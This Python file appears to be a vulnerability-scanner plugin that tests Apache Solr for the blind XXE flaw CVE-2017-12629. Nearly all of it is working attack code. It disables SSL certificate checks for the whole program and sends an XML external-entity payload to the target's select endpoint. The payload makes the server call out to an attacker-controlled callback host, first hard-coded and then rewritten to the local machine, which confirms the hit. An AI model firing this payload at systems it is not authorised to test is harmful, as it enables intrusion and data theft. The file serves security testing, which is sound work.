# coding: utf-8

import time
import random
import requests
import socket
import warnings
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)

def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if apache solr blind xxe vul(CVE-2017-12629)')
    warnings.filterwarnings("ignore")
    payload = '/solr/demo/select?q=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://xxe.675ba661.2m1.pw/">%remote;]><root/>&wt=xml&defType=xmlparser'
    socket.setdefaulttimeout(3)
    #vulnurl = url + payload
    try:
        dnsserver = get_ver_ip(ip)
        random_num = random_str(6 + 15 - len(dnsserver))
        b = 'http://' + dnsserver + ':8088/add/' + random_num
        payload = payload.replace('http://xxe.675ba661.2m1.pw/', b)
        vulnurl = url + payload
        req = requests.get(url=vulnurl, verify=False, timeout=5)
        time.sleep(3)
        verifyreq = requests.get("http://%s:8088/check/%s" % (dnsserver, random_num), timeout=5)
        if 'YES' in verifyreq.text:
            msg = 'There is apache solr blind xxe vul(CVE-2017-12629) on url :' + vulnurl + ' .'
            number = 'v114'
            return True, url, number, msg
        else:
            msg = 'There is no apache solr blind xxe vul(CVE-2017-12629)'
            number = 'v0'
            return False, url, number, msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg



